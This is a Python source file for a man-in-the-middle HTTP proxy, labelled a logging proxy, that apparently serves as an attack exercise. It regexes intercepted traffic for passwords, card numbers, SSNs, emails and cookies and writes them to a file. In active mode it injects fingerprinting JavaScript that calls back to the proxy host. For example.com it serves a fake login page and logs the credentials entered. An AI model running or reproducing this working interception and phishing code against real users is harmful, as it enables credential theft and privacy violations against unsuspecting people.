import argparse
import re
import socket
from urllib.parse import urlparse, parse_qs, unquote

def extract_sensitive_info(data):
    # Define patterns for various types of sensitive information
    regex_patterns = {
        "firstname": r"firstname=([a-zA-Z]+)",  # First name
        "lastname": r"lastname=([a-zA-Z]+)",  # Last name
        "email": r"(?:email=)([a-zA-Z0-9._%+-]+[@%40][a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",  # Email pattern allowing @ or %40
        "username": r"(?:username)=([a-zA-Z0-9._%+-]+)", # Username Pattern
        "password": r"(?:password|passwd|pwd)=([^&\s]+)",  # Password pattern
        "credit_card": r"(?:credit[-_]?card=)(\d{13,16})",  # Credit card pattern
        "ssn": r"(?:social[-_]?security=)(\d{3}-\d{2}-\d{4})",  # Social Security number pattern
        "phone": r"(?:phone=)(\d{3}-\d{3}-\d{4})",  # US phone number pattern
        "address": r"(?:address=)([A-Za-z0-9\s,]+)",  # US address pattern
        "city": r"(?:city=)([A-Za-z\s]+)",  # City
        "state": r"(?:state=)([A-Z]{2})",  # State (2-letter abbreviation)
        "zip": r"(?:zip=)(\d{5})",  # ZIP code
        "cookies": r"(Cookie: )([^\r\n]+)"  # Captures cookies in HTTP headers
    }

    found_data = {}
    for key, pattern in regex_patterns.items():
        matches = re.findall(pattern, data)
        if matches:
            unquoted_matches = [unquote(match if not isinstance(match, tuple) else ''.join(match)) for match in matches]
            found_data[key] = unquoted_matches
    return found_data

def log_passive_info(data):
    # Continuously log sensitive info to `info1.txt`
    sensitive_info = extract_sensitive_info(data)
    if sensitive_info:
        with open("info1.txt", "a") as log_file:
            for key, values in sensitive_info.items():
                for value in values:
                    log_file.write(f"{key}: {value}\n")

def log_active_info(data):
    if re.match("GET", data):
        parsed_url = urlparse(data.split(" ")[1])  # Extract the URL part of the GET request
        query_params = parse_qs(parsed_url.query)

        # Extract User-Agent, Screen Resolution, and Language from the query string
        user_agent = unquote(query_params.get('user-agent', ['N/A'])[0])
        screen_res = unquote(query_params.get('screen', ['N/A'])[0])
        language = unquote(query_params.get('lang', ['N/A'])[0])

        with open("info2.txt", "a") as log_file:
            log_file.write(f"Extracted Client Information:\n")
            log_file.write(f"User-Agent: {user_agent}\n")
            log_file.write(f"Screen Resolution: {screen_res}\n")
            log_file.write(f"Language: {language}\n")
            log_file.write("\n")  # Add a newline for better readability

def inject_javascript(response, proxy_ip):
    print(proxy_ip)
    js_code = f"""
    <script>
        (function() {{
            var img = new Image();
            img.src = 'http://{proxy_ip}:8080/?user-agent=' + encodeURIComponent(navigator.userAgent) +
                         '&screen=' + encodeURIComponent(window.screen.width + 'x' + window.screen.height) +
                         '&lang=' + encodeURIComponent(navigator.language || navigator.userLanguage);
            document.body.appendChild(img);
        }})();
    </script>
    """
    modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
    if "</body>" in response:
        modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
        print("Injected JS code into response.")
    else:
        print("No </body> tag found; Couldn't Inject")
    return modified_response

def handle_client(client_socket, mode, proxy_ip):
    # Receive client request
    request = client_socket.recv(4096).decode('utf-8', errors='ignore')
    print("Received request:", request)  # Add this for debugging
    
    if request.startswith("GET") or request.startswith("POST"):
        host_match = re.search(r"Host: (.+)\r\n", request)
        if host_match:
            destination_host = host_match.group(1).strip()
        else:
            client_socket.close()
            return  # Exit if there's no valid Host header

        # Resolve the destination IP and set port 80 as default for HTTP
        try:
            if ":" not in destination_host:
                destination_ip = socket.gethostbyname(destination_host)
                destination_port = 80
            else:
                destination_host_split = destination_host.split(sep=':')
                destination_ip = destination_host_split[0]
                destination_port = int(destination_host_split[1]) if destination_host_split[1].isdigit() else 80
        except socket.gaierror:
            client_socket.close()
            return

        # Serve phishing page for `GET http://example.com/`
        if request.startswith("GET") and destination_host == "example.com":
            phishing_page = """HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login Page</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #f2f2f2;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-container {
                        background-color: #ffffff;
                        padding: 20px 30px;
                        border-radius: 8px;
                        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                        text-align: center;
                    }
                    .login-container h2 {
                        margin-bottom: 15px;
                    }
                    .login-container input {
                        width: 100%;
                        padding: 10px;
                        margin: 8px 0;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        box-sizing: border-box;
                    }
                    .login-container button {
                        width: 100%;
                        padding: 10px;
                        background-color: #4CAF50;
                        border: none;
                        color: white;
                        border-radius: 4px;
                        cursor: pointer;
                    }
                    .login-container button:hover {
                        background-color: #45a049;
                    }
                    .login-container a {
                        display: block;
                        margin-top: 10px;
                        color: #4CAF50;
                        text-decoration: none;
                    }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h2>Login</h2>
                    <form method="POST" action="/login">
                        <input type="text" placeholder="Username" name="username" required>
                        <input type="password" placeholder="Password" name="password" required>
                        <button type="submit">Login</button>
                    </form>
                </div>
            </body>
            </html>
            """
            client_socket.send(phishing_page.encode('utf-8'))
            client_socket.close()
            return

        # Handle `POST` request to `/login` by responding with a `GET https://example.com/`
        if request.startswith("POST") and destination_host == "example.com" and "/login" in request.split(" ")[1]:
            log_passive_info(f"Phishing page served for {destination_host}. Request details: {request}")
            get_request = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"
            forward_request(client_socket, destination_ip, destination_port, get_request, mode, proxy_ip)
            return

        if mode == "passive":
            log_passive_info(request)
        elif mode == "active" and destination_ip == proxy_ip:
            log_active_info(request)

        # Forward request to the actual destination for all other cases
        forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip)
    else:
        print("Invalid or unsupported request.")
        client_socket.close()

def forward_request(client_socket, destination_ip, destination_port, request, mode, proxy_ip):
    """Forward the request to the actual destination and return the response."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.connect((destination_ip, destination_port))
        server_socket.send(request.encode('utf-8'))

        # Receive and forward response in chunks to handle large responses
        while True:
            response = server_socket.recv(4096)
            if len(response) == 0:
                break  # Exit loop when no more data is received

            if mode == "active":
                response_decoded = response.decode('utf-8', errors='ignore')
                response_with_js = inject_javascript(response_decoded, proxy_ip)
                client_socket.send(response_with_js.encode('utf-8'))
            else:
                # Send the response back to the client exactly as received
                client_socket.send(response)
    except ConnectionRefusedError:
        print(f"Connection to refused.")
    finally:
        client_socket.close()
        server_socket.close()

def start_proxy(ip, port, mode):
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((ip, port))
    proxy_socket.listen(5)
    print(f"Proxy listening on {ip}:{port} in {mode} mode...")

    while True:
        client_socket, addr = proxy_socket.accept()
        handle_client(client_socket, mode, ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Transparent Proxy for Logging")
    parser.add_argument("-m", "--mode", choices=["active","passive"], required=True, help="Mode: passive only")
    parser.add_argument("ip", help="Listening IP address")
    parser.add_argument("port", type=int, help="Listening port")
    args = parser.parse_args()

    start_proxy(args.ip, args.port, args.mode)
